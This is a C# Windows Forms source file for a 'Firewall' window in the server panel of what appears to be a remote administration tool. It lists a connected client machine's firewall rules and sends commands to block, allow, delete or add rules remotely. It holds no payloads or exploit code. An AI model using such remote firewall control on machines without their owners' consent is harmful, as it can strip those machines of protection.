using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;
using Leb128;
using MaterialSkin;
using MaterialSkin.Controls;
using Server.Connectings;
using Server.Helper;

namespace Server.Forms;

public class FormFirewall : FormMaterial
{
	public Clients client;

	public Clients parrent;

	private IContainer components;

	private DataGridViewTextBoxColumn Column7;

	private DataGridViewTextBoxColumn Column6;

	private DataGridViewTextBoxColumn Column5;

	private DataGridViewTextBoxColumn Column3;

	private DataGridViewTextBoxColumn Column2;

	private DataGridViewTextBoxColumn Column1;

	private DataGridViewTextBoxColumn Column8;

	public MaterialLabel materialLabel1;

	private Panel panel1;

	private ToolStripMenuItem toolStripMenuItem2;

	private ToolStripMenuItem killRemoveToolStripMenuItem;

	private ToolStripMenuItem refreshToolStripMenuItem;

	private ToolStripMenuItem deleteToolStripMenuItem;

	private ToolStripMenuItem addToolStripMenuItem;

	private ContextMenuStrip contextMenuStrip1;

	private Timer timer1;

	private DataGridViewTextBoxColumn Column4;

	public DataGridView dataGridView2;

	public FormFirewall()
	{
		InitializeComponent();
		base.FormClosing += Closing1;
	}

	private void FormProcess_Load(object sender, EventArgs e)
	{
		MaterialSkinManager.Instance.ThemeChanged += ChangeScheme;
		ChangeScheme(this);
		timer1.Start();
		typeof(DataGridView).InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, dataGridView2, new object[1] { true });
	}

	private void ChangeScheme(object sender)
	{
		dataGridView2.ColumnHeadersDefaultCellStyle.SelectionForeColor = FormMaterial.PrimaryColor;
		dataGridView2.ColumnHeadersDefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
		dataGridView2.DefaultCellStyle.SelectionBackColor = FormMaterial.PrimaryColor;
		dataGridView2.DefaultCellStyle.ForeColor = FormMaterial.PrimaryColor;
	}

	private void Closing1(object sender, EventArgs e)
	{
		if (client != null)
		{
			client.Disconnect();
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (parrent != null && !parrent.itsConnect)
		{
			Close();
		}
		if (client != null && !client.itsConnect)
		{
			Close();
		}
	}

	private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
	{
		client.Send(LEB128.Write(new object[1] { "Refresh" }));
	}

	private void blockToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in dataGridView2.SelectedRows)
		{
			string name = selectedRow.Cells[0].Value?.ToString();
			if (!string.IsNullOrEmpty(name))
			{
				client.Send(LEB128.Write(new object[3] { "Action", name, "Block" }));
			}
		}
	}

	private void allowToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in dataGridView2.SelectedRows)
		{
			string name = selectedRow.Cells[0].Value?.ToString();
			if (!string.IsNullOrEmpty(name))
			{
				client.Send(LEB128.Write(new object[3] { "Action", name, "Allow" }));
			}
		}
	}

	private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (dataGridView2.SelectedRows.Count == 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in dataGridView2.SelectedRows)
		{
			string name = selectedRow.Cells[0].Value?.ToString();
			if (!string.IsNullOrEmpty(name))
			{
				client.Send(LEB128.Write(new object[2] { "Delete", name }));
			}
		}
	}

	private void addToolStripMenuItem_Click(object sender, EventArgs e)
	{
		using FormInput formInput = new FormInput();
		formInput.Text = "Block Application";
		formInput.rjTextBox1.PlaceholderText = "C:\\path\\to\\app.exe";
		formInput.ShowDialog();
		if (formInput.Run && !string.IsNullOrEmpty(formInput.rjTextBox1.Texts))
		{
			client.Send(LEB128.Write(new object[2]
			{
				"Add",
				formInput.rjTextBox1.Texts
			}));
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormFirewall));
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle1 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		this.Column7 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column6 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column5 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column3 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column2 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Column8 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.materialLabel1 = new MaterialSkin.Controls.MaterialLabel();
		this.panel1 = new System.Windows.Forms.Panel();
		this.toolStripMenuItem2 = new System.Windows.Forms.ToolStripMenuItem();
		this.killRemoveToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.refreshToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.deleteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.addToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.Column4 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.dataGridView2 = new System.Windows.Forms.DataGridView();
		this.panel1.SuspendLayout();
		this.contextMenuStrip1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.dataGridView2).BeginInit();
		base.SuspendLayout();
		this.Column7.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.DisplayedCells;
		this.Column7.HeaderText = "Remote Port";
		this.Column7.Name = "Column7";
		this.Column7.ReadOnly = true;
		this.Column7.Width = 99;
		this.Column6.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.DisplayedCells;
		this.Column6.HeaderText = "Local Port";
		this.Column6.MinimumWidth = 80;
		this.Column6.Name = "Column6";
		this.Column6.ReadOnly = true;
		this.Column6.Width = 87;
		this.Column5.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.DisplayedCells;
		this.Column5.HeaderText = "Protocol";
		this.Column5.MinimumWidth = 70;
		this.Column5.Name = "Column5";
		this.Column5.ReadOnly = true;
		this.Column5.Width = 78;
		this.Column3.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.DisplayedCells;
		this.Column3.HeaderText = "Action";
		this.Column3.MinimumWidth = 70;
		this.Column3.Name = "Column3";
		this.Column3.ReadOnly = true;
		this.Column3.Width = 70;
		this.Column2.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.DisplayedCells;
		this.Column2.HeaderText = "Group";
		this.Column2.MinimumWidth = 100;
		this.Column2.Name = "Column2";
		this.Column2.ReadOnly = true;
		this.Column2.Width = 100;
		this.Column1.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
		this.Column1.HeaderText = "Name";
		this.Column1.MinimumWidth = 200;
		this.Column1.Name = "Column1";
		this.Column1.ReadOnly = true;
		this.Column8.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.DisplayedCells;
		this.Column8.HeaderText = "Enabled";
		this.Column8.Name = "Column8";
		this.Column8.ReadOnly = true;
		this.Column8.Width = 77;
		this.materialLabel1.AutoSize = true;
		this.materialLabel1.Depth = 0;
		this.materialLabel1.Font = new System.Drawing.Font("Roboto", 14f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel);
		this.materialLabel1.Location = new System.Drawing.Point(2, 1);
		this.materialLabel1.MouseState = MaterialSkin.MouseState.HOVER;
		this.materialLabel1.Name = "materialLabel1";
		this.materialLabel1.Size = new System.Drawing.Size(94, 19);
		this.materialLabel1.TabIndex = 1;
		this.materialLabel1.Text = "Please wait...";
		this.panel1.BackColor = System.Drawing.Color.White;
		this.panel1.Controls.Add(this.materialLabel1);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Bottom;
		this.panel1.ForeColor = System.Drawing.Color.Black;
		this.panel1.Location = new System.Drawing.Point(3, 577);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(994, 20);
		this.panel1.TabIndex = 18;
		this.toolStripMenuItem2.BackColor = System.Drawing.Color.White;
		this.toolStripMenuItem2.ForeColor = System.Drawing.Color.Black;
		this.toolStripMenuItem2.Image = (System.Drawing.Image)resources.GetObject("toolStripMenuItem2.Image");
		this.toolStripMenuItem2.Name = "toolStripMenuItem2";
		this.toolStripMenuItem2.Size = new System.Drawing.Size(155, 22);
		this.toolStripMenuItem2.Text = "Allow";
		this.toolStripMenuItem2.Click += new System.EventHandler(allowToolStripMenuItem_Click);
		this.killRemoveToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.killRemoveToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
		this.killRemoveToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("killRemoveToolStripMenuItem.Image");
		this.killRemoveToolStripMenuItem.Name = "killRemoveToolStripMenuItem";
		this.killRemoveToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
		this.killRemoveToolStripMenuItem.Text = "Block";
		this.killRemoveToolStripMenuItem.Click += new System.EventHandler(blockToolStripMenuItem_Click);
		this.refreshToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.refreshToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
		this.refreshToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("refreshToolStripMenuItem.Image");
		this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
		this.refreshToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
		this.refreshToolStripMenuItem.Text = "Refresh";
		this.refreshToolStripMenuItem.Click += new System.EventHandler(refreshToolStripMenuItem_Click);
		this.deleteToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.deleteToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
		this.deleteToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("deleteToolStripMenuItem.Image");
		this.deleteToolStripMenuItem.Name = "deleteToolStripMenuItem";
		this.deleteToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
		this.deleteToolStripMenuItem.Text = "Delete";
		this.deleteToolStripMenuItem.Click += new System.EventHandler(deleteToolStripMenuItem_Click);
		this.addToolStripMenuItem.BackColor = System.Drawing.Color.White;
		this.addToolStripMenuItem.ForeColor = System.Drawing.Color.Black;
		this.addToolStripMenuItem.Image = (System.Drawing.Image)resources.GetObject("addToolStripMenuItem.Image");
		this.addToolStripMenuItem.Name = "addToolStripMenuItem";
		this.addToolStripMenuItem.Size = new System.Drawing.Size(155, 22);
		this.addToolStripMenuItem.Text = "Add (Block File)";
		this.addToolStripMenuItem.Click += new System.EventHandler(addToolStripMenuItem_Click);
		this.contextMenuStrip1.BackColor = System.Drawing.Color.White;
		this.contextMenuStrip1.ForeColor = System.Drawing.Color.Black;
		this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.refreshToolStripMenuItem, this.addToolStripMenuItem, this.killRemoveToolStripMenuItem, this.toolStripMenuItem2, this.deleteToolStripMenuItem });
		this.contextMenuStrip1.Name = "contextMenuStrip1";
		this.contextMenuStrip1.Size = new System.Drawing.Size(156, 114);
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.Column4.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.DisplayedCells;
		this.Column4.HeaderText = "Direction";
		this.Column4.MinimumWidth = 70;
		this.Column4.Name = "Column4";
		this.Column4.ReadOnly = true;
		this.Column4.Width = 81;
		this.dataGridView2.AllowDrop = true;
		this.dataGridView2.AllowUserToAddRows = false;
		this.dataGridView2.AllowUserToDeleteRows = false;
		this.dataGridView2.AllowUserToResizeColumns = false;
		this.dataGridView2.AllowUserToResizeRows = false;
		dataGridViewCellStyle1.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle1.ForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle1.SelectionBackColor = System.Drawing.Color.FromArgb(70, 130, 180);
		dataGridViewCellStyle1.SelectionForeColor = System.Drawing.Color.White;
		this.dataGridView2.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle1;
		this.dataGridView2.BackgroundColor = System.Drawing.Color.White;
		this.dataGridView2.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.dataGridView2.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.dataGridView2.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.TopLeft;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridView2.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		this.dataGridView2.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dataGridView2.Columns.AddRange(this.Column1, this.Column2, this.Column3, this.Column4, this.Column5, this.Column6, this.Column7, this.Column8);
		this.dataGridView2.ContextMenuStrip = this.contextMenuStrip1;
		this.dataGridView2.Cursor = System.Windows.Forms.Cursors.Default;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Arial", 9f);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.Black;
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(70, 130, 180);
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.dataGridView2.DefaultCellStyle = dataGridViewCellStyle3;
		this.dataGridView2.Dock = System.Windows.Forms.DockStyle.Fill;
		this.dataGridView2.Enabled = false;
		this.dataGridView2.EnableHeadersVisualStyles = false;
		this.dataGridView2.GridColor = System.Drawing.Color.FromArgb(17, 17, 17);
		this.dataGridView2.Location = new System.Drawing.Point(3, 64);
		this.dataGridView2.Name = "dataGridView2";
		this.dataGridView2.ReadOnly = true;
		this.dataGridView2.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle4.Font = new System.Drawing.Font("Microsoft Sans Serif", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
		dataGridViewCellStyle4.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle4.Padding = new System.Windows.Forms.Padding(1, 0, 0, 0);
		dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.FromArgb(0, 192, 0);
		dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.FromArgb(17, 17, 17);
		dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.dataGridView2.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
		this.dataGridView2.RowHeadersVisible = false;
		this.dataGridView2.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.dataGridView2.ShowCellErrors = false;
		this.dataGridView2.ShowCellToolTips = false;
		this.dataGridView2.ShowEditingIcon = false;
		this.dataGridView2.ShowRowErrors = false;
		this.dataGridView2.Size = new System.Drawing.Size(994, 513);
		this.dataGridView2.TabIndex = 19;
		base.Load += new System.EventHandler(FormProcess_Load);
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(1000, 600);
		base.Controls.Add(this.panel1);
		base.Controls.Add(this.dataGridView2);
		base.Name = "FormFirewall";
		this.Text = "Firewall";
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		this.contextMenuStrip1.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.dataGridView2).EndInit();
		base.ResumeLayout(false);
	}
}
